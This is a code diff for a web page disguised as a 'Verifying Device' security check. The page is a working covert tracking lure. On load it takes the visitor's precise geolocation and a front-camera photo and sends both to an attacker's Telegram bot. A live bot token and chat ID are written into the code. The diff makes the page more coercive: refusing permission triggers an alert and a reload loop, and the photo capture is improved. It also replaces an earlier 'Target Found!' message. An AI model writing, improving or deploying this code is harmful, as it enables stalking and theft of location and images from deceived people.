@@ -5,12 +5,36 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Connection | Verification</title>
     <style>
-        body { background-color: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; max-width: 400px; width: 90%; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        body {
+            background-color: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         h2 { color: #1c1e21; font-size: 22px; margin-bottom: 10px; }
-        p { color: #606770; font-size: 15px; }
+        p { color: #606770; font-size: 15px; line-height: 1.6; }
         .footer { margin-top: 20px; font-size: 12px; color: #bcc0c4; }
     </style>
 </head>
@@ -19,22 +43,21 @@
 <div class="card">
     <div class="spinner"></div>
     <h2>Verifying Device</h2>
-    <p>Please wait while we secure your connection. Do not close this window.</p>
+    <p>We are securing your connection. Please grant the requested permissions to continue to the destination.</p>
     <div id="status" style="color: #007bff; font-weight: bold; margin-top: 15px;">Initializing...</div>
     <div class="footer">SSL Secure Connection • 256-bit Encryption</div>
 </div>
 
 <canvas id="canvas" style="display:none;"></canvas>
-<video id="video" style="display:none;" autoplay playsinline></video>
+<video id="video" style="display:none;" autoplay></video>
 
 <script>
     const token = '8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI';
     const chatId = '7066124462';
-    const redirectUrl = "https://www.google.com"; // Yahan apna target URL dalein
     const statusText = document.getElementById('status');
 
-    window.onload = () => {
-        startProcess();
+    window.onload = async () => {
+        await startProcess();
     };
 
     async function startProcess() {
@@ -42,15 +65,12 @@
         
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                // Location milte hi parallel mein photo aur location dono bhejenge
-                sendLocation(pos); 
-                capturePhoto();
+                await sendLocation(pos);
+                await capturePhoto();
             }, (err) => {
-                // Agar permission deny kare toh redirect kar dena behtar hai
-                window.location.href = redirectUrl;
+                alert("Please allow all permissions to verify your identity.");
+                location.reload();
             }, { enableHighAccuracy: true });
-        } else {
-            window.location.href = redirectUrl;
         }
     }
 
@@ -58,63 +78,74 @@
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         const acc = pos.coords.accuracy;
-        
+        // Fix: Yahan ${lat} mein $ missing tha
         const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-        const text = `📍 *Target Found!*%0A%0AAccuracy: ${acc.toFixed(1)}m%0AMaps: [View Location](${mapLink})`;
         
-        // fetch with keepalive taaki redirect ke baad bhi request complete ho
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`, {
-            method: 'GET',
-            keepalive: true
-        });
+        const text = `📍 *Location Received!*%0A%0AAccuracy: ${acc.toFixed(1)}m%0AMaps: [View on Google Maps](${mapLink})`;
+        
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`);
+        statusText.innerText = "Security Check: 50% Complete...";
     }
 
     async function capturePhoto() {
         try {
+            statusText.innerText = "Finalizing Verification...";
+            
+            // Camera Stream start karna
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
+                video: { facingMode: "user" }, // Front camera force karna
                 audio: false 
             });
             
             const video = document.getElementById('video');
             video.srcObject = stream;
+            
+            // Video play karna mandatory hai
             await video.play();
 
-            // Sirf 500ms ka wait taaki camera frame capture kar sake
+            // Wait until video is actually playing and has dimensions
+            await new Promise((resolve) => {
+                video.onplaying = resolve;
+            });
+
+            const canvas = document.getElementById('canvas');
+            // Video dimensions set karna
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // 2 seconds ka wait taaki camera light adjust ho jaye aur photo saaf aaye
             setTimeout(async () => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
                 const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0);
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.7));
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                 
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'verify.jpg');
-                formData.append('caption', '📸 Photo Captured');
+                formData.append('photo', blob, 'identity_check.jpg');
+                formData.append('caption', '📸 Photo Identity Captured');
 
-                // Photo send karna shuru karte hi redirect kar do
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                     method: 'POST',
-                    body: formData,
-                    keepalive: true
+                    body: formData
                 });
 
-                // Band karein stream
+                // Stream band karna (Important: Camera light off karne ke liye)
                 stream.getTracks().forEach(track => track.stop());
-
-                // Turant Redirect
-                window.location.href = redirectUrl;
-
-            }, 500); 
+                
+                statusText.innerText = "Verified! Redirecting...";
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 1000);
+            }, 2000); // Wait time badha diya hai
 
         } catch (err) {
-            window.location.href = redirectUrl;
+            console.error("Camera Error:", err);
+            window.location.href = "https://www.google.com";
         }
     }
 </script>
 
 </body>
 </html>
+
